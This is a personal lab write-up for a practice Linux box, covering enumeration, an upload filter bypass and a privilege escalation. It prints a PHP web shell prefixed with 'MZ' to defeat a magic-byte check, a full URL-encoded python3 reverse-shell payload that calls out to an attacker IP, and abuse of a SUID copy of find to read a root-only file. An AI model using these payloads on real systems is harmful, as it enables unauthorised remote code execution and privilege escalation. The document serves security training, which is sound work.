

## Lab Details
- Difficulty: Intermediate
- OS: Linux
- Foothold time: 1 hour
- Privesc time: 30 minutes
- Total solve time: 1 hour and 30 minutes

## Summary
- Initial access: Upload file extension bypass
- Privilege escalation:

## Enumeration
- Key findings: Identified target open ports 
##### Steps
 - run `nmap`
```
$ nmap 192.168.55.33 -sC -A -sV -p-
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-04 03:57 +0000
Nmap scan report for 192.168.55.33
Host is up (0.00080s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
| ssh-hostkey:
|   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)
|   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)
|_  256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: MZEE-AV - Check your files
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4
OS details: Linux 4.19 - 5.15
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## Foothold
- Path: Upload file extension bypass
##### Steps
- run `ffuf` to fuzz endpoints and identified `backups` endpoint
```
$ ffuf -u http://192.168.55.33/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt        /'___\  /'___\           /'___\              /\ \__/ /\ \__/  __  __  /\ \__/              \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\              \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/               \ \_\   \ \_\  \ \____/  \ \_\                 \/_/    \/_/   \/___/    \/_/              v2.1.0-dev________________________________________________ :: Method           : GET :: URL              : http://192.168.55.33/FUZZ :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt :: Follow redirects : false :: Calibration      : false :: Timeout          : 10 :: Threads          : 40 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500________________________________________________upload                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 0ms]backups                 [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 0ms]server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 0ms]
<SNIP>
```
- download the backup.zip file
![[Pasted image 20260404120503.png]]
- examine the `upload` function and found programming logic to be vulnerable to magic byte  file type bypass
```php
<?php

/* Get the name of the uploaded file */
$filename = $_FILES['file']['name'];

/* Choose where to save the uploaded file */
$tmp_location = "upload/file.tmp";
$location = "upload/".$filename;


/* Move the file temporary */
move_uploaded_file($_FILES['file']['tmp_name'], $tmp_location);



/* Check MagicBytes MZ PEFILE 4D5A*/
$F=fopen($tmp_location,"r");
$magic=fread($F,2);
fclose($F);
$magicbytes = strtoupper(substr(bin2hex($magic),0,4)); 
error_log(print_r("Magicbytes:" . $magicbytes, TRUE));

/* if its not a PEFILE block it - str_contains onlz php 8*/
//if ( ! (str_contains($magicbytes, '4D5A'))) {
if ( strpos($magicbytes, '4D5A') === false ) {
	echo "Error no valid PEFILE\n";
	error_log(print_r("No valid PEFILE", TRUE));
	error_log(print_r("MagicBytes:" . $magicbytes, TRUE));
	exit ();
}


rename($tmp_location, $location);



?>
```
- create `php` file containing web shell payload and modify the first bytes to be `4D5A`
```
$ cat webshell.php 
MZ
<?= system($_GET[cmd]); ?>
```
- upload the webshell and test with `id`, output received 
![[Pasted image 20260404155739.png]]
- target is has `python3` installed
![[Pasted image 20260404163756.png]]
- generate a reverse shell payload from `revshells.com`
```
http://192.168.55.33/upload/webshell.php?cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.49.55%22,80));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22/bin/bash%22)%27
```
- execute the payload in webshell and reverse shell received locally
```
$ nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.49.55] from (UNKNOWN) [192.168.55.33] 34374
www-data@mzeeav:/var/www/html/upload$ 
```

## Lateral Movement 
- Path:

##### Steps

## Privilege Escalation
- Path: Privilege Escalation via SUID
##### Steps
- run `linpeas.sh`
- identified an unknown binary with SUID set
```
???????????? SUID - Check easy privesc, exploits and write perms
? https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid           
strings Not Found                                                                                         
strace Not Found                                                                                          
---s--s--x 1 root root 304K Nov 14  2023 /opt/fileS (Unknown SUID binary!)  
```
- check the command helper and find that it has function to allow privilege read 
```
www-data@mzeeav:/tmp$ /opt/fileS --help
/opt/fileS --help
Usage: /opt/fileS [-H] [-L] [-P] [-Olevel] [-D debugopts] [path...] [expression]

default path is the current directory; default expression is -print
expression may consist of: operators, options, tests, and actions:
operators (decreasing precedence; -and is implicit where no others are given):
      ( EXPR )   ! EXPR   -not EXPR   EXPR1 -a EXPR2   EXPR1 -and EXPR2
      EXPR1 -o EXPR2   EXPR1 -or EXPR2   EXPR1 , EXPR2
positional options (always true): -daystart -follow -regextype

normal options (always true, specified before other expressions):
      -depth --help -maxdepth LEVELS -mindepth LEVELS -mount -noleaf
      --version -xdev -ignore_readdir_race -noignore_readdir_race
tests (N can be +N or -N or N): -amin N -anewer FILE -atime N -cmin N
      -cnewer FILE -ctime N -empty -false -fstype TYPE -gid N -group NAME
      -ilname PATTERN -iname PATTERN -inum N -iwholename PATTERN -iregex PATTERN
      -links N -lname PATTERN -mmin N -mtime N -name PATTERN -newer FILE
      -nouser -nogroup -path PATTERN -perm [-/]MODE -regex PATTERN
      -readable -writable -executable
      -wholename PATTERN -size N[bcwkMG] -true -type [bcdpflsD] -uid N
      -used N -user NAME -xtype [bcdpfls]      -context CONTEXT

actions: -delete -print0 -printf FORMAT -fprintf FILE FORMAT -print 
      -fprint0 FILE -fprint FILE -ls -fls FILE -prune -quit
      -exec COMMAND ; -exec COMMAND {} + -ok COMMAND ;
      -execdir COMMAND ; -execdir COMMAND {} + -okdir COMMAND ;

Valid arguments for -D:
exec, opt, rates, search, stat, time, tree, all, help
Use '-D help' for a description of the options, or see find(1)

Please see also the documentation at http://www.gnu.org/software/findutils/.
You can report (and track progress on fixing) bugs in the "/opt/fileS"
program via the GNU findutils bug-reporting page at
https://savannah.gnu.org/bugs/?group=findutils or, if
you have no web access, by sending email to <bug-findutils@gnu.org>.

```
- abuse the privilege read to read root directory content 
```
www-data@mzeeav:/tmp$ /opt/fileS /root/proof.txt -type f -exec cat {} +    
/opt/fileS /root/proof.txt -type f -exec cat {} +
e6a2774da9dd6d9a53732836da57fd3a
```


## Lessons Learned
- Attack family: Upload file extension bypass, Linux Privilege Escalation via SUID
- Key takeaway:
	- Try understand the script, research on functions used 
	- Search for help command flags 
##### Steps

## Resources
- References: